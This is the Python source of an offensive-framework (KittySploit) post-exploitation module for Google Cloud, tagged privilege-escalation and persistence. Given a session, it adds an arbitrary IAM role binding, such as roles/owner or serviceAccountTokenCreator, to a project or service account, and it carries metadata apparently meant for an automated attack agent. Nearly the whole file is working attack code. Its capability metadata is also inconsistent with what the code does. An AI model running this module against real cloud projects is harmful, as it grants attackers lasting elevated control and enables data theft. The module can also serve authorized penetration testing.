#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Set IAM Policy Binding",
        "description": "Add an IAM role binding for a member on the project or a service account",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "iam", "privilege-escalation", "persistence"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'api_request'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    role = OptString("", "IAM role to bind (e.g. roles/owner, roles/iam.serviceAccountTokenCreator)", True)
    member = OptString("", "Principal to bind; email or prefixed member (user:, serviceAccount:, group:)", True)
    resource_type = OptString(
        "project",
        "Policy target: project or service_account",
        False,
    )
    service_account_email = OptString(
        "",
        "Service account email when resource_type=service_account",
        False,
    )
    dry_run = OptBool(False, "Fetch and show the merged policy without applying it", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            role = str(self.role or "").strip()
            member = str(self.member or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not role:
                print_error("role is required")
                return False
            if not member:
                print_error("member is required")
                return False

            normalized_member = self._gcp_normalize_member(member)
            resource_type = str(self.resource_type or "project").strip().lower()
            if resource_type == "project":
                fetch = self._gcp_get_project_iam_policy(project_id)
                set_policy = lambda policy: self._gcp_set_project_iam_policy(project_id, policy)
                target_label = f"project {project_id}"
            elif resource_type == "service_account":
                sa_email = str(self.service_account_email or "").strip()
                if not sa_email:
                    print_error("service_account_email is required when resource_type=service_account")
                    return False
                fetch = self._gcp_get_service_account_iam_policy(project_id, sa_email)
                set_policy = lambda policy: self._gcp_set_service_account_iam_policy(
                    project_id, sa_email, policy
                )
                target_label = f"service account {sa_email}"
            else:
                print_error("resource_type must be 'project' or 'service_account'")
                return False

            if not fetch.get("ok"):
                print_error(f"Failed to read IAM policy for {target_label}: {fetch.get('error', '')}")
                return False

            current_policy = fetch.get("policy") or {}
            merged_policy = self._gcp_merge_iam_binding(current_policy, role, normalized_member)
            print_info(f"Adding binding on {target_label}: {role} -> {normalized_member}")

            if self.dry_run:
                print_warning("Dry run enabled; policy not applied")
                output = {
                    "project_id": project_id,
                    "resource_type": resource_type,
                    "target": target_label,
                    "role": role,
                    "member": normalized_member,
                    "merged_policy": merged_policy,
                    "applied": False,
                }
                print_info(json.dumps(merged_policy, indent=2)[:4000])
                return self.module_result(success=True, data=output)

            apply_result = set_policy(merged_policy)
            if not apply_result.get("ok"):
                print_error(f"IAM policy update failed: {apply_result.get('error', '')}")
                return False

            updated = apply_result.get("policy") or {}
            print_success(f"IAM binding applied on {target_label}")
            summary = self._summarize_bindings(updated)
            print_info(
                f"Updated policy: {summary.get('binding_count', 0)} binding(s), "
                f"{len(summary.get('roles') or [])} role(s)"
            )

            output = {
                "project_id": project_id,
                "resource_type": resource_type,
                "target": target_label,
                "role": role,
                "member": normalized_member,
                "policy": updated,
                "applied": True,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"IAM policy binding update failed: {exc}")
            return False
